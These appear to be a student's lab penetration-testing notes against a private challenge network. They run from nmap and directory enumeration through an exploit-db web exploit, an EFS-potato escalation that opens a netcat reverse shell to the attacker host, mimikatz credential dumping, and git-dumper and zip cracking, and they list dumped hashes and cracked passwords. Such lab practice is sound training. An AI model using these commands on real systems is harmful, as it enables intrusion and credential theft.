initial enumeration
- -A: Enable OS detection, version detection, script scanning, and traceroute
- -sT: connect scan
```
nmap -sT -A -oN nmap-lab1 192.168.193.141 192.168.193.143-145
```

.141
```
gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf,zip
# find admin page on 181

# determined that the admin username field was vulnerable to sqli, but could not manually do SQL injection
# Look up Attendance and Payroll system on exploit-db find and modify https://www.exploit-db.com/exploits/50801 to use the correct paths and get a shell, also modify shell body to be /home/kali/relia/shell.php

python3 50801.py http://192.168.193.141:81
nc -nvlp 1234

Get-Childitem –Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
```
.141 privesc
```
iwr -uri http://192.168.45.219:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# writable
C:\wamp64\bin\apache\apache2.4.51\bin\httpd.exe
c:\wamp64\bin\mariadb\mariadb10.6.5\bin\mysqld.exe
c:\wamp64\bin\mysql\mysql5.7.36\bin\mysqld.exe

# write perms on
c:\wamp64

# mary.williams hash
Mary.Williams::MS01:1122334455667788:1658020ce90cc357879f186905dabc89:0101000000000000d9d435765b25da01361df5c7c2071a3a00000000080030003000000000000000000000000030000093126ea9f314e0e1b58a6af629f6420f919a633c583c5a70fae7a07bb7099da60a00100000000000000000000000000000000000090000000000000000000000 

# can't crack it
hashcat -m 1000 mw.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# ssh file
C:\Users\All Users\ssh\ssh_host_rsa_key.pub

# using EFS potato we can get a root shell on 9999
iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe
.\efspotato.exe "nc.exe 192.168.45.219 9999 -e cmd"
```
.14 post exploitation
```
iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
. .\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::cache 
token::elevate
lsadump::sam

# got mary.williams hash 
# got celia.almeda hash - e728ecbadfb02f51ce8eed753f3ff3fd
# support hash - d9358122015c5b159574a88b3c0d2071 - cracked: Freedom1
# Administrator hash - 3c4495bbd678fac8c9d218be4f2bbc7b - cracked: December31 

# TEST
```

.143
```
nmap 192.168.193.143
# open ports: 21,22,80,81,443,3000,3003,3306,5432

nmap -sT -A -Pn -p 80,81 192.168.193.143
nmap -sT -A -Pn -p 21,22 192.168.193.143

gobuster dir -u http://192.168.193.143 -w /usr/share/wordlists/dirb/big.txt
gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirb/big.txt
# try feroxbuster
feroxbuster http://192.168.193.143


gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

whatweb 192.168.193.143
whatweb 192.168.193.143:81
sudo nmap -O 192.168.193.143 --osscan-guess

# mysql, ftp and postgres don't work
ftp support@192.168.193.143
mysql -u support -p 'Freedom1' -h 192.168.193.143 -P 3306
psql -h 192.168.193.143 -p 5432 -d postgres -U support

# findings:
- has pico CMS
```

.144
```
nmap 192.168.193.144
nmap -sT -A -Pn -p 80 192.168.193.144
gobuster dir -u http://192.168.193.144 -w /usr/share/wordlists/dirb/big.txt
# find that it is running joomla CMS
# also find a git repo that includes a security update
joomscan -u http://192.168.193.144
# joomscan for me does not return anything

# use gitdumper to gain creds from the git logs
https://github.com/arthaud/git-dumper/blob/master/git_dumper.py
python3 git_dumper.py http://192.168.193.144 /home/kali/lab1/test
git show # reveal password
# username: stuart@challenge.lab
# password: BreakingBad92
ftp stuart@192.168.193.144

# only the 3rd backup file can be read
zip2john sitebackup3.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# show passwords and unzip using password
john --show zip.hash
unzip -P codeblue sitebackup3.zip
# there is an issue with unzipping so use another tool
7z -pcodeblue x sitebackup3.zip 
# check out configuration.php in the joomla output directory
# obtain some creds
user: joomla, password: Password@1
secret: Ee24zIK4cDhJHL4H
another user: chloe

# ssh as stuart and use secret 
su chloe # enter password
sudo -l
sudo su
```